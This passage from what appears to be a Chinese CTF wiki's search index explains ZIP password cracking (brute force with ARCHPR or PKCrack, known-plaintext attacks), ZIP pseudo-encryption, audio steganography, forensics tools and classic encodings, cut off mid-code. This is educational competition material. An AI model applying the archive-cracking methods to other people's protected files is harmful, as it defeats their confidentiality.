\u6253\u5305\u5b8c\u6210\u540e\uff0c\u9700\u8981\u786e\u8ba4\u4e8c\u8005\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u76f8\u540c\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u7528 WinRAR \u6253\u5f00\u6587\u4ef6\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u538b\u7f29\u540e\u7684\u4f53\u79ef\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\uff0c\u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u4f60\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u5c1d\u8bd5\u53e6\u4e00\u79cd\u538b\u7f29\u7b97\u6cd5\u3002","title":"\u539f\u7406"},{"location":"misc/archive/zip/#_8","text":"Windows\u4e0b\u7684\u795e\u5668 ARCHPR Linux\u4e0b\u7684 PKCrack Note \u5efa\u8bae\u4f7f\u7528 Windows \u7684 ARCHPR\uff0c\u4e00\u662f\u901f\u5ea6\u8f83\u5feb\uff0c\u4e8c\u662f\u8f83\u7a33\u5b9a\uff08\u4e4b\u524d\u51fa\u9898\u65f6\u9047\u5230\u8fc7\u7528 PKCrack \u7206\u4e0d\u51fa\u6765\u7684\u60c5\u51b5\uff09\u3002","title":"\u5de5\u5177"},{"location":"misc/archive/zip/#_9","text":"","title":"\u4f2a\u52a0\u5bc6"},{"location":"misc/archive/zip/#_10","text":"\u5728\u4e0a\u6587 ZIP \u683c\u5f0f\u4e2d\u7684 \u6838\u5fc3\u76ee\u5f55\u533a \u4e2d\uff0c\u6211\u4eec\u5f3a\u8c03\u4e86\u4e00\u4e2a\u53eb\u505a\u901a\u7528\u4f4d\u6807\u8bb0\uff08General purpose bit flag\uff09\u7684 2 \u5b57\u8282\uff0c\u4e0d\u540c\u6bd4\u7279\u4f4d\u6709\u7740\u4e0d\u540c\u7684\u542b\u4e49\u3002 Bit 0 : If set, indicates that the file is encrypted. ( For Method 6 - Imploding ) Bit 1 : If the compression method used was type 6 , Imploding, then this bit, if set, indicates an 8K sliding dictionary was used. If clear, then a 4K sliding dictionary was used. ... Bit 6 : Strong encryption. If this bit is set, you should set the version needed to extract value to at least 50 and you must also set bit 0 . If AES encryption is used, the version needed to extract value must be at least 51 . ... \u5728 010Editor \u4e2d\u6211\u4eec\u5c1d\u8bd5\u7740\u5c06\u8fd9 1 \u4f4d\u4fee\u6539 0 --> 1 \u3002 \u518d\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5df2\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u3002 \u4fee\u6539\u4f2a\u52a0\u5bc6\u7684\u65b9\u6cd5\uff1a 16 \u8fdb\u5236\u4e0b\u4fee\u6539\u901a\u7528\u4f4d\u6807\u8bb0 binwalk -e \u65e0\u89c6\u4f2a\u52a0\u5bc6 \u5728 Mac OS \u53ca\u90e8\u5206 Linux\uff08\u5982 Kali\uff09\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00\u4f2a\u52a0\u5bc6\u7684 ZIP \u538b\u7f29\u5305 \u68c0\u6d4b\u4f2a\u52a0\u5bc6\u7684\u5c0f\u5de5\u5177 ZipCenOp.jar \u6709\u65f6\u5019\u7528 WinRar \u7684\u4fee\u590d\u529f\u80fd\uff08\u6b64\u65b9\u6cd5\u6709\u65f6\u6709\u5947\u6548\uff0c\u4e0d\u4ec5\u9488\u5bf9\u4f2a\u52a0\u5bc6\uff09","title":"\u539f\u7406"},{"location":"misc/archive/zip/#_11","text":"SSCTF-2017:\u6211\u4eec\u7684\u79d8\u5bc6\u662f\u7eff\u8272\u7684 WP: http://bobao.360.cn/ctf/detail/197.html \u6211\u4eec\u5728\u5f97\u5230\u4e24\u4e2a readme.txt \uff0c\u4e14\u4e00\u4e2a\u52a0\u5bc6\uff0c\u4e00\u4e2a\u5df2\u77e5\uff0c\u5f88\u5bb9\u6613\u60f3\u5230\u660e\u6587\u653b\u51fb\u7684\u624b\u6cd5\u3002 \u6ce8\u610f\u5728\u7528\u660e\u6587\u653b\u51fb\u65f6\u7684\u64cd\u4f5c\u3002 \u5f97\u5230\u5bc6\u7801 Y29mZmVl \u540e\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\uff0c\u5f97\u5230\u53e6\u4e00\u4e2a\u538b\u7f29\u5305\u3002 \u89c2\u5bdf\u901a\u7528\u4f4d\u6807\u8bb0\u4f4d\uff0c\u731c\u6d4b\u4f2a\u52a0\u5bc6\uff0c\u4fee\u6539\u540e\u89e3\u538b\u5f97\u5230 flag\u3002 \u8fd9\u4e00\u9898\uff0c\u57fa\u672c\u6db5\u76d6\u4e86\u6bd4\u8d5b\u4e2d ZIP \u7684\u5e38\u89c1\u8003\u5bdf\u624b\u6cd5\uff0c\u7206\u7834\uff0c\u4f2a\u52a0\u5bc6\uff0c\u660e\u6587\u653b\u51fb\u7b49\uff0c\u90fd\u5728\u672c\u9898\u4e2d\u51fa\u73b0\u3002","title":"\u4f8b\u9898"},{"location":"misc/audio/introduction/","text":"\u4e0e\u97f3\u9891\u76f8\u5173\u7684 CTF \u9898\u76ee\u4e3b\u8981\u4f7f\u7528\u4e86\u9690\u5199\u7684\u7b56\u7565\uff0c\u4e3b\u8981\u5206\u4e3a MP3 \u9690\u5199\uff0cLSB \u9690\u5199\uff0c\u6ce2\u5f62\u9690\u5199\uff0c\u9891\u8c31\u9690\u5199\u7b49\u7b49\u3002 \u5e38\u89c1\u624b\u6bb5 \u00b6 \u901a\u8fc7 binwalk \u4ee5\u53ca strings \u53ef\u4ee5\u53d1\u73b0\u7684\u4fe1\u606f\u4e0d\u518d\u8be6\u8ff0\u3002 MP3 \u9690\u5199 \u00b6 \u539f\u7406 \u00b6 MP3\u9690\u5199\u4e3b\u8981\u662f\u4f7f\u7528 Mp3Stego \u5de5\u5177\u8fdb\u884c\u9690\u5199\uff0c\u5176\u57fa\u672c\u4ecb\u7ecd\u53ca\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b MP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream. encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3 decode -X -P pass svega_stego.mp3 \u4f8b\u9898 \u00b6 ISCC-2016: Music Never Sleep \u521d\u6b65\u89c2\u5bdf\u540e\uff0c\u7531 strings \u65e0\u53d1\u73b0\uff0c\u542c\u97f3\u9891\u65e0\u5f02\u5e38\u731c\u6d4b\u4f7f\u7528\u9690\u5199\u8f6f\u4ef6\u9690\u85cf\u6570\u636e\u3002 \u5f97\u5230\u5bc6\u7801\u540e\u4f7f\u7528 Mp3Stego \u89e3\u5bc6\u3002 decode.exe -X ISCC2016.mp3 -P bfsiscc2016 \u5f97\u5230\u6587\u4ef6 iscc2016.mp3.txt : Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ??? Base64 && Base32 \u540e\u5f97\u5230 flag\u3002 \u6ce2\u5f62 \u00b6 \u539f\u7406 \u00b6 \u901a\u5e38\u6765\u8bf4\uff0c\u6ce2\u5f62\u65b9\u5411\u7684\u9898\uff0c\u5728\u89c2\u5bdf\u5230\u5f02\u5e38\u540e\uff0c\u4f7f\u7528\u76f8\u5173\u8f6f\u4ef6\uff08Audacity, Adobe Audition \u7b49\uff09\u89c2\u5bdf\u6ce2\u5f62\u89c4\u5f8b\uff0c\u5c06\u6ce2\u5f62\u8fdb\u4e00\u6b65\u8f6c\u5316\u4e3a 01 \u5b57\u7b26\u4e32\u7b49\uff0c\u4ece\u800c\u63d0\u53d6\u8f6c\u5316\u51fa\u6700\u7ec8\u7684 flag\u3002 \u4f8b\u9898 \u00b6 ISCC-2017: Misc-04 \u5176\u5b9e\u8fd9\u9898\u9690\u85cf\u7684\u4fe1\u606f\u5728\u6700\u5f00\u59cb\u7684\u4e00\u6bb5\u97f3\u9891\u5185\uff0c\u4e0d\u7ec6\u5fc3\u542c\u53ef\u80fd\u4f1a\u8bef\u8ba4\u4e3a\u662f\u9690\u5199\u8f6f\u4ef6\u3002 \u4ee5\u9ad8\u4e3a 1 \u4f4e\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 01 \u5b57\u7b26\u4e32\u3002 110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101 \u8f6c\u4e3a ASCII\uff0c\u6469\u65af\u5bc6\u7801\u89e3\u5bc6\uff0c\u5f97\u5230 flag\u3002 Note \u4e00\u4e9b\u8f83\u590d\u6742\u7684\u53ef\u80fd\u4f1a\u5148\u5bf9\u97f3\u9891\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u5904\u7406\uff0c\u5982\u6ee4\u6ce2\u7b49\u3002\u4f8b\u5982 JarvisOJ - \u4e0a\u5e1d\u4e4b\u97f3 Writeup \u9891\u8c31 \u00b6 \u539f\u7406 \u00b6 \u97f3\u9891\u4e2d\u7684\u9891\u8c31\u9690\u5199\u662f\u5c06\u5b57\u7b26\u4e32\u9690\u85cf\u5728\u9891\u8c31\u4e2d\uff0c\u6b64\u7c7b\u97f3\u9891\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u7279\u5f81\uff0c\u542c\u8d77\u6765\u662f\u4e00\u6bb5\u6742\u97f3\u6216\u8005\u6bd4\u8f83\u523a\u8033\u3002 \u4f8b\u9898 \u00b6 Su-ctf-quals-2014:hear_with_your_eyes LSB\u97f3\u9891\u9690\u5199 \u00b6 \u539f\u7406 \u00b6 \u7c7b\u4f3c\u4e8e\u56fe\u7247\u9690\u5199\u4e2d\u7684 LSB \u9690\u5199\uff0c\u97f3\u9891\u4e2d\u4e5f\u6709\u5bf9\u5e94\u7684 LSB \u9690\u5199\u3002\u4e3b\u8981\u53ef\u4ee5\u4f7f\u7528 Silenteye \u5de5\u5177\uff0c\u5176\u4ecb\u7ecd\u5982\u4e0b\uff1a SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system. \u4f8b\u9898 \u00b6 2015 \u5e7f\u4e1c\u7701\u5f3a\u7f51\u676f - Little Apple \u76f4\u63a5\u4f7f\u7528 slienteye \u5373\u53ef\u3002 \u5ef6\u4f38 \u00b6 \u97f3\u9891\u4e2d\u7684 LSB \u9690\u5199\u672f\u603b\u7ed3","title":"\u97f3\u9891\u9690\u5199"},{"location":"misc/audio/introduction/#_1","text":"\u901a\u8fc7 binwalk \u4ee5\u53ca strings \u53ef\u4ee5\u53d1\u73b0\u7684\u4fe1\u606f\u4e0d\u518d\u8be6\u8ff0\u3002","title":"\u5e38\u89c1\u624b\u6bb5"},{"location":"misc/audio/introduction/#mp3","text":"","title":"MP3 \u9690\u5199"},{"location":"misc/audio/introduction/#_2","text":"MP3\u9690\u5199\u4e3b\u8981\u662f\u4f7f\u7528 Mp3Stego \u5de5\u5177\u8fdb\u884c\u9690\u5199\uff0c\u5176\u57fa\u672c\u4ecb\u7ecd\u53ca\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b MP3Stego will hide information in MP3 files during the compression process. The data is first compressed, encrypted and then hidden in the MP3 bit stream. encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3 decode -X -P pass svega_stego.mp3","title":"\u539f\u7406"},{"location":"misc/audio/introduction/#_3","text":"ISCC-2016: Music Never Sleep \u521d\u6b65\u89c2\u5bdf\u540e\uff0c\u7531 strings \u65e0\u53d1\u73b0\uff0c\u542c\u97f3\u9891\u65e0\u5f02\u5e38\u731c\u6d4b\u4f7f\u7528\u9690\u5199\u8f6f\u4ef6\u9690\u85cf\u6570\u636e\u3002 \u5f97\u5230\u5bc6\u7801\u540e\u4f7f\u7528 Mp3Stego \u89e3\u5bc6\u3002 decode.exe -X ISCC2016.mp3 -P bfsiscc2016 \u5f97\u5230\u6587\u4ef6 iscc2016.mp3.txt : Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ??? Base64 && Base32 \u540e\u5f97\u5230 flag\u3002","title":"\u4f8b\u9898"},{"location":"misc/audio/introduction/#_4","text":"","title":"\u6ce2\u5f62"},{"location":"misc/audio/introduction/#_5","text":"\u901a\u5e38\u6765\u8bf4\uff0c\u6ce2\u5f62\u65b9\u5411\u7684\u9898\uff0c\u5728\u89c2\u5bdf\u5230\u5f02\u5e38\u540e\uff0c\u4f7f\u7528\u76f8\u5173\u8f6f\u4ef6\uff08Audacity, Adobe Audition \u7b49\uff09\u89c2\u5bdf\u6ce2\u5f62\u89c4\u5f8b\uff0c\u5c06\u6ce2\u5f62\u8fdb\u4e00\u6b65\u8f6c\u5316\u4e3a 01 \u5b57\u7b26\u4e32\u7b49\uff0c\u4ece\u800c\u63d0\u53d6\u8f6c\u5316\u51fa\u6700\u7ec8\u7684 flag\u3002","title":"\u539f\u7406"},{"location":"misc/audio/introduction/#_6","text":"ISCC-2017: Misc-04 \u5176\u5b9e\u8fd9\u9898\u9690\u85cf\u7684\u4fe1\u606f\u5728\u6700\u5f00\u59cb\u7684\u4e00\u6bb5\u97f3\u9891\u5185\uff0c\u4e0d\u7ec6\u5fc3\u542c\u53ef\u80fd\u4f1a\u8bef\u8ba4\u4e3a\u662f\u9690\u5199\u8f6f\u4ef6\u3002 \u4ee5\u9ad8\u4e3a 1 \u4f4e\u4e3a 0\uff0c\u8f6c\u6362\u5f97\u5230 01 \u5b57\u7b26\u4e32\u3002 110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101 \u8f6c\u4e3a ASCII\uff0c\u6469\u65af\u5bc6\u7801\u89e3\u5bc6\uff0c\u5f97\u5230 flag\u3002 Note \u4e00\u4e9b\u8f83\u590d\u6742\u7684\u53ef\u80fd\u4f1a\u5148\u5bf9\u97f3\u9891\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u5904\u7406\uff0c\u5982\u6ee4\u6ce2\u7b49\u3002\u4f8b\u5982 JarvisOJ - \u4e0a\u5e1d\u4e4b\u97f3 Writeup","title":"\u4f8b\u9898"},{"location":"misc/audio/introduction/#_7","text":"","title":"\u9891\u8c31"},{"location":"misc/audio/introduction/#_8","text":"\u97f3\u9891\u4e2d\u7684\u9891\u8c31\u9690\u5199\u662f\u5c06\u5b57\u7b26\u4e32\u9690\u85cf\u5728\u9891\u8c31\u4e2d\uff0c\u6b64\u7c7b\u97f3\u9891\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u7279\u5f81\uff0c\u542c\u8d77\u6765\u662f\u4e00\u6bb5\u6742\u97f3\u6216\u8005\u6bd4\u8f83\u523a\u8033\u3002","title":"\u539f\u7406"},{"location":"misc/audio/introduction/#_9","text":"Su-ctf-quals-2014:hear_with_your_eyes","title":"\u4f8b\u9898"},{"location":"misc/audio/introduction/#lsb","text":"","title":"LSB\u97f3\u9891\u9690\u5199"},{"location":"misc/audio/introduction/#_10","text":"\u7c7b\u4f3c\u4e8e\u56fe\u7247\u9690\u5199\u4e2d\u7684 LSB \u9690\u5199\uff0c\u97f3\u9891\u4e2d\u4e5f\u6709\u5bf9\u5e94\u7684 LSB \u9690\u5199\u3002\u4e3b\u8981\u53ef\u4ee5\u4f7f\u7528 Silenteye \u5de5\u5177\uff0c\u5176\u4ecb\u7ecd\u5982\u4e0b\uff1a SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.","title":"\u539f\u7406"},{"location":"misc/audio/introduction/#_11","text":"2015 \u5e7f\u4e1c\u7701\u5f3a\u7f51\u676f - Little Apple \u76f4\u63a5\u4f7f\u7528 slienteye \u5373\u53ef\u3002","title":"\u4f8b\u9898"},{"location":"misc/audio/introduction/#_12","text":"\u97f3\u9891\u4e2d\u7684 LSB \u9690\u5199\u672f\u603b\u7ed3","title":"\u5ef6\u4f38"},{"location":"misc/disk-memory/introduction/","text":"\u5e38\u7528\u5de5\u5177 \u00b6 EasyRecovery MedAnalyze FTK Elcomsoft Forensic Disk Decryptor Volatility \u78c1\u76d8 \u00b6 \u5e38\u89c1\u7684\u78c1\u76d8\u5206\u533a\u683c\u5f0f\u6709\u4ee5\u4e0b\u51e0\u79cd Windows: FAT12 -> FAT16 -> FAT32 -> NTFS Linux: EXT2 -> EXT3 -> EXT4 FAT \u4e3b\u78c1\u76d8\u7ed3\u6784 \u5220\u9664\u6587\u4ef6\uff1a\u76ee\u5f55\u8868\u4e2d\u6587\u4ef6\u540d\u7b2c\u4e00\u5b57\u8282 e5 \u3002 VMDK \u00b6 VMDK \u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u7269\u7406\u786c\u76d8\u7684\u865a\u62df\u7248\uff0c\u4e5f\u4f1a\u5b58\u5728\u8ddf\u7269\u7406\u786c\u76d8\u7684\u5206\u533a\u548c\u6247\u533a\u4e2d\u7c7b\u4f3c\u7684\u586b\u5145\u533a\u57df\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u586b\u5145\u533a\u57df\u6765\u628a\u6211\u4eec\u9700\u8981\u9690\u85cf\u7684\u6570\u636e\u9690\u85cf\u5230\u91cc\u9762\u53bb\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9690\u85cf\u7684\u6587\u4ef6\u589e\u52a0\u4e86 VMDK \u6587\u4ef6\u7684\u5927\u5c0f\uff08\u5982\u76f4\u63a5\u9644\u52a0\u5230\u6587\u4ef6\u540e\u7aef\uff09\uff0c\u4e5f\u53ef\u4ee5\u907f\u514d\u7531\u4e8e VMDK \u6587\u4ef6\u5927\u5c0f\u7684\u6539\u53d8\u6240\u5e26\u6765\u7684\u53ef\u80fd\u5bfc\u81f4\u7684\u865a\u62df\u673a\u9519\u8bef\u3002\u800c\u4e14 VMDK \u6587\u4ef6\u4e00\u822c\u6bd4\u8f83\u5927\uff0c\u9002\u5408\u7528\u4e8e\u9690\u85cf\u5927\u6587\u4ef6\u3002 \u5185\u5b58 \u00b6 \u89e3\u6790 Windows / Linux / Mac OS X \u5185\u5b58\u7ed3\u6784 \u5206\u6790\u8fdb\u7a0b\uff0c\u5185\u5b58\u6570\u636e \u6839\u636e\u9898\u76ee\u63d0\u793a\u5bfb\u627e\u7ebf\u7d22\u548c\u601d\u8def\uff0c\u63d0\u53d6\u5206\u6790\u6307\u5b9a\u8fdb\u7a0b\u7684\u7279\u5b9a\u5185\u5b58\u6570\u636e \u9898\u76ee \u00b6 Jarvis OJ - MISC - \u53d6\u8bc1 2 \u53c2\u8003 \u00b6 \u6570\u636e\u9690\u85cf\u6280\u672f","title":"\u78c1\u76d8\u5185\u5b58\u5206\u6790"},{"location":"misc/disk-memory/introduction/#_1","text":"EasyRecovery MedAnalyze FTK Elcomsoft Forensic Disk Decryptor Volatility","title":"\u5e38\u7528\u5de5\u5177"},{"location":"misc/disk-memory/introduction/#_2","text":"\u5e38\u89c1\u7684\u78c1\u76d8\u5206\u533a\u683c\u5f0f\u6709\u4ee5\u4e0b\u51e0\u79cd Windows: FAT12 -> FAT16 -> FAT32 -> NTFS Linux: EXT2 -> EXT3 -> EXT4 FAT \u4e3b\u78c1\u76d8\u7ed3\u6784 \u5220\u9664\u6587\u4ef6\uff1a\u76ee\u5f55\u8868\u4e2d\u6587\u4ef6\u540d\u7b2c\u4e00\u5b57\u8282 e5 \u3002","title":"\u78c1\u76d8"},{"location":"misc/disk-memory/introduction/#vmdk","text":"VMDK \u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u7269\u7406\u786c\u76d8\u7684\u865a\u62df\u7248\uff0c\u4e5f\u4f1a\u5b58\u5728\u8ddf\u7269\u7406\u786c\u76d8\u7684\u5206\u533a\u548c\u6247\u533a\u4e2d\u7c7b\u4f3c\u7684\u586b\u5145\u533a\u57df\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u586b\u5145\u533a\u57df\u6765\u628a\u6211\u4eec\u9700\u8981\u9690\u85cf\u7684\u6570\u636e\u9690\u85cf\u5230\u91cc\u9762\u53bb\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9690\u85cf\u7684\u6587\u4ef6\u589e\u52a0\u4e86 VMDK \u6587\u4ef6\u7684\u5927\u5c0f\uff08\u5982\u76f4\u63a5\u9644\u52a0\u5230\u6587\u4ef6\u540e\u7aef\uff09\uff0c\u4e5f\u53ef\u4ee5\u907f\u514d\u7531\u4e8e VMDK \u6587\u4ef6\u5927\u5c0f\u7684\u6539\u53d8\u6240\u5e26\u6765\u7684\u53ef\u80fd\u5bfc\u81f4\u7684\u865a\u62df\u673a\u9519\u8bef\u3002\u800c\u4e14 VMDK \u6587\u4ef6\u4e00\u822c\u6bd4\u8f83\u5927\uff0c\u9002\u5408\u7528\u4e8e\u9690\u85cf\u5927\u6587\u4ef6\u3002","title":"VMDK"},{"location":"misc/disk-memory/introduction/#_3","text":"\u89e3\u6790 Windows / Linux / Mac OS X \u5185\u5b58\u7ed3\u6784 \u5206\u6790\u8fdb\u7a0b\uff0c\u5185\u5b58\u6570\u636e \u6839\u636e\u9898\u76ee\u63d0\u793a\u5bfb\u627e\u7ebf\u7d22\u548c\u601d\u8def\uff0c\u63d0\u53d6\u5206\u6790\u6307\u5b9a\u8fdb\u7a0b\u7684\u7279\u5b9a\u5185\u5b58\u6570\u636e","title":"\u5185\u5b58"},{"location":"misc/disk-memory/introduction/#_4","text":"Jarvis OJ - MISC - \u53d6\u8bc1 2","title":"\u9898\u76ee"},{"location":"misc/disk-memory/introduction/#_5","text":"\u6570\u636e\u9690\u85cf\u6280\u672f","title":"\u53c2\u8003"},{"location":"misc/encode/communication/","text":"\u7535\u8bdd\u62e8\u53f7\u7f16\u7801 \u00b6 1-9 \u5206\u522b\u4f7f\u7528 1-9 \u4e2a\u8109\u51b2\uff0c0 \u5219\u8868\u793a\u4f7f\u7528 10 \u4e2a\u8109\u51b2\u3002 Morse \u7f16\u7801 \u00b6 \u53c2\u89c1 \u6469\u5c14\u65af\u7f16\u7801 -\u7ef4\u57fa\u767e\u79d1 \uff0c\u5bf9\u5e94\u8868\u5982\u4e0b \u7279\u70b9 \u00b6 \u53ea\u6709 . \u548c - \uff1b \u6700\u591a 6 \u4f4d\uff1b \u4e5f\u53ef\u4ee5\u4f7f\u7528 01 \u4e32\u8868\u793a\u3002 \u5de5\u5177 \u00b6 \u6469\u5c14\u65af\u7f16\u7801\u5728\u7ebf\u8f6c\u6362 \u9898\u76ee \u00b6 JarvisOJ - Basec - \u300c-.-\u5b57\u7b26\u4e32\u300d \u6572\u51fb\u7801 \u00b6 \u6572\u51fb\u7801\uff08Tap code\uff09\u662f\u4e00\u79cd\u4ee5\u975e\u5e38\u7b80\u5355\u7684\u65b9\u5f0f\u5bf9\u6587\u672c\u4fe1\u606f\u8fdb\u884c\u7f16\u7801\u7684\u65b9\u6cd5\u3002\u56e0\u8be5\u7f16\u7801\u5bf9\u4fe1\u606f\u901a\u8fc7\u4f7f\u7528\u4e00\u7cfb\u5217\u7684\u70b9\u51fb\u58f0\u97f3\u6765\u7f16\u7801\u800c\u547d\u540d\uff0c\u6572\u51fb\u7801\u662f\u57fa\u4e8e 5 \u00d75 \u65b9\u683c\u6ce2\u5229\u6bd4\u5965\u65af\u65b9\u9635\u6765\u5b9e\u73b0\u7684\uff0c\u4e0d\u540c\u70b9\u662f\u662f\u7528 K \u5b57\u6bcd\u88ab\u6574\u5408\u5230 C \u4e2d\u3002 1 2 3 4 5 1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z \u66fc\u5f7b\u65af\u7279\u7f16\u7801 \u00b6 \u66fc\u5f7b\u65af\u7279\u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1 \u683c\u96f7\u7f16\u7801 \u00b6 \u683c\u96f7\u7801 - \u7ef4\u57fa\u767e\u79d1","title":"\u901a\u4fe1\u9886\u57df\u5e38\u7528\u7f16\u7801"},{"location":"misc/encode/communication/#_1","text":"1-9 \u5206\u522b\u4f7f\u7528 1-9 \u4e2a\u8109\u51b2\uff0c0 \u5219\u8868\u793a\u4f7f\u7528 10 \u4e2a\u8109\u51b2\u3002","title":"\u7535\u8bdd\u62e8\u53f7\u7f16\u7801"},{"location":"misc/encode/communication/#morse","text":"\u53c2\u89c1 \u6469\u5c14\u65af\u7f16\u7801 -\u7ef4\u57fa\u767e\u79d1 \uff0c\u5bf9\u5e94\u8868\u5982\u4e0b","title":"Morse \u7f16\u7801"},{"location":"misc/encode/communication/#_2","text":"\u53ea\u6709 . \u548c - \uff1b \u6700\u591a 6 \u4f4d\uff1b \u4e5f\u53ef\u4ee5\u4f7f\u7528 01 \u4e32\u8868\u793a\u3002","title":"\u7279\u70b9"},{"location":"misc/encode/communication/#_3","text":"\u6469\u5c14\u65af\u7f16\u7801\u5728\u7ebf\u8f6c\u6362","title":"\u5de5\u5177"},{"location":"misc/encode/communication/#_4","text":"JarvisOJ - Basec - \u300c-.-\u5b57\u7b26\u4e32\u300d","title":"\u9898\u76ee"},{"location":"misc/encode/communication/#_5","text":"\u6572\u51fb\u7801\uff08Tap code\uff09\u662f\u4e00\u79cd\u4ee5\u975e\u5e38\u7b80\u5355\u7684\u65b9\u5f0f\u5bf9\u6587\u672c\u4fe1\u606f\u8fdb\u884c\u7f16\u7801\u7684\u65b9\u6cd5\u3002\u56e0\u8be5\u7f16\u7801\u5bf9\u4fe1\u606f\u901a\u8fc7\u4f7f\u7528\u4e00\u7cfb\u5217\u7684\u70b9\u51fb\u58f0\u97f3\u6765\u7f16\u7801\u800c\u547d\u540d\uff0c\u6572\u51fb\u7801\u662f\u57fa\u4e8e 5 \u00d75 \u65b9\u683c\u6ce2\u5229\u6bd4\u5965\u65af\u65b9\u9635\u6765\u5b9e\u73b0\u7684\uff0c\u4e0d\u540c\u70b9\u662f\u662f\u7528 K \u5b57\u6bcd\u88ab\u6574\u5408\u5230 C \u4e2d\u3002 1 2 3 4 5 1 A B C/K D E 2 F G H I J 3 L M N O P 4 Q R S T U 5 V W X Y Z","title":"\u6572\u51fb\u7801"},{"location":"misc/encode/communication/#_6","text":"\u66fc\u5f7b\u65af\u7279\u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1","title":"\u66fc\u5f7b\u65af\u7279\u7f16\u7801"},{"location":"misc/encode/communication/#_7","text":"\u683c\u96f7\u7801 - \u7ef4\u57fa\u767e\u79d1","title":"\u683c\u96f7\u7f16\u7801"},{"location":"misc/encode/computer/","text":"\u672c\u8282\u4ecb\u7ecd\u4e00\u4e9b\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u7f16\u7801\u3002 \u5b57\u6bcd\u8868\u7f16\u7801 \u00b6 A-Z/a-z \u5bf9\u5e94 1-26 \u6216\u8005 0-25 ASCII \u7f16\u7801 \u00b6 \u7279\u70b9 \u00b6 \u6211\u4eec\u4e00\u822c\u4f7f\u7528\u7684 ascii \u7f16\u7801\u7684\u65f6\u5019\u91c7\u7528\u7684\u90fd\u662f\u53ef\u89c1\u5b57\u7b26\uff0c\u800c\u4e14\u4e3b\u8981\u662f\u5982\u4e0b\u5b57\u7b26 0-9, 49-57 A-Z, 65-90 a-z, 97-122 \u53d8\u5f62 \u00b6 \u4e8c\u8fdb\u5236\u7f16\u7801 \u00b6 \u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u4e8c\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002 \u53ea\u6709 0 \u548c 1 \u4e0d\u5927\u4e8e 8 \u4f4d\uff0c\u4e00\u822c 7 \u4f4d\u4e5f\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53ef\u89c1\u5b57\u7b26\u5230 127\u3002 \u5176\u5b9e\u662f\u53e6\u4e00\u79cd ascii \u7f16\u7801\u3002 \u5341\u516d\u8fdb\u5236\u7f16\u7801 \u00b6 \u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002 A-Z\u219241-5 A a-z\u219261-7 A \u5de5\u5177 \u00b6 jpk, ascii to number, number to ascii http://www.ab126.com/goju/1711.html \u4f8b\u5b50 \u00b6 2018 DEFCON Quals ghettohackers: Throwback \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem! \u7b2c\u4e00\u76f4\u89c9\u5e94\u8be5\u662f\u6211\u4eec\u53bb\u8865\u5168\u8fd9\u4e9b\u53f9\u53f7\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230 flag\uff0c\u4f46\u662f\u8865\u5168\u540e\u5e76\u4e0d\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u628a\u6e90\u5b57\u7b26\u4e32\u6309\u7167 ! \u5206\u5272\uff0c\u7136\u540e\u5b57\u7b26\u4e32\u957f\u5ea6 1 \u5bf9\u5e94\u5b57\u6bcda\uff0c\u957f\u5ea6 2 \u5bf9\u5e94\u5b57\u6bcd b\uff0c\u4ee5\u6b64\u7c7b\u63a8 ori = 'Anyo!e!howouldsacrificepo!icyforexecu!!onspeedthink!securityisacomm!ditytop!urintoasy!tem!' sp = ori.split ( '!' ) print repr ( '' .join ( chr ( 97 + len ( s ) - 1 ) for s in 